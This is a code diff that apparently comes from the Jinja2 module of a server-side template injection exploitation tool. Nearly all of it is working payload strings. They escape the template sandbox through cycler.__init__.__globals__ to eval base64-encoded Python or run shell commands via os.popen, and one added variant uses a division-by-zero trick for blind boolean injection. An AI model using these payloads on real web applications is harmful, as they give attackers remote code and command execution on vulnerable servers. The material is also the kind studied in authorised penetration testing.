@@ -38,12 +38,16 @@ class Jinja2(python.Python):
                 'call': 'render',
                 'evaluate': """{{{{cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode())}}}}"""
             },
+            'evaluate_error': {
+                'evaluate': """cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).rstrip()"""
+            },
+            'evaluate_boolean': {
+                'call': 'inject',
+                'evaluate_blind': """{{{{1 / (not not cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__('base64').urlsafe_b64decode('{code_b64}').decode()))}}}}"""
+            },
             'execute': {
                 'call': 'render',
                 'execute': """{{{{cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read()}}}}"""
-            },
-            'evaluate_error': {
-                'evaluate': """cycler.__init__.__globals__.__builtins__.eval(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).rstrip()"""
             },
             'execute_error': {
                 'execute': """cycler.__init__.__globals__.os.popen(cycler.__init__.__globals__.__builtins__.__import__("base64").urlsafe_b64decode("{code_b64}").decode()).read().rstrip()"""
